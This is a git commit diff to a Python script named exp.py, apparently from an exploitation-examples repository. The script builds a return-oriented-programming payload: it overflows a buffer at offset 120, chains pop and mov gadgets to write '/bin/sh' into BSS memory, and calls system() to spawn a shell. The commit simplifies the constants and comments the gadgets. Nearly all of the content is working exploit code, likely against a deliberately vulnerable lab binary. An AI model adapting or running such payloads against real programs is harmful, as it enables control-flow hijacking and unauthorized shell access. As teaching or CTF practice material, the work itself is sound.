f4889a51d5701c48af730132d45bf8b8bc31db08
elleven11 <federico.cassano@federico.codes>
2023-04-09 03:22:26 -0400

    exp

--- examples/system/exp.py
+++ examples/system/exp.py
@@ -3,12 +3,15 @@ import sys
 SYSTEM_ADDR = b"\x00\x00\x00\x00\x00\x40\x10\x30"[::-1]
 BINSH = b"/bin/sh\x00"
 
-BSS1 = b"\x00\x00\x00\x00\x00\x40\x40\x30"[::-1]
-BSS2 = b"\x00\x00\x00\x00\x00\x40\x40\x50"[::-1]
+BSS = b"\x00\x00\x00\x00\x00\x40\x40\x30"[::-1]
 
+#  __asm__("mov %rax, (%rdx); ret");
 MEM_MOVE = b"\x00\x00\x00\x00\x00\x40\x11\x5a"[::-1]
+# __asm__("pop %rdx; ret");
 POP_RDX = b"\x00\x00\x00\x00\x00\x40\x11\x5e"[::-1]
+# __asm__("pop %rax; ret");
 POP_RAX = b"\x00\x00\x00\x00\x00\x40\x11\x60"[::-1]
+# __asm__("pop %rdi; ret");
 POP_RDI = b"\x00\x00\x00\x00\x00\x40\x11\x62"[::-1]
 
 LOC_TO_RET = 120
@@ -19,14 +22,12 @@ PAYLOAD = GARBAGE
 PAYLOAD += POP_RAX
 PAYLOAD += BINSH
 PAYLOAD += POP_RDX
-PAYLOAD += BSS1
+PAYLOAD += BSS
 PAYLOAD += MEM_MOVE
 # put into rdi
 PAYLOAD += POP_RDI
-PAYLOAD += BSS1
+PAYLOAD += BSS
 # call system
 PAYLOAD += SYSTEM_ADDR
-
-#  PAYLOAD += SYSTEM_ADDR
 
 sys.stdout.buffer.write(PAYLOAD)
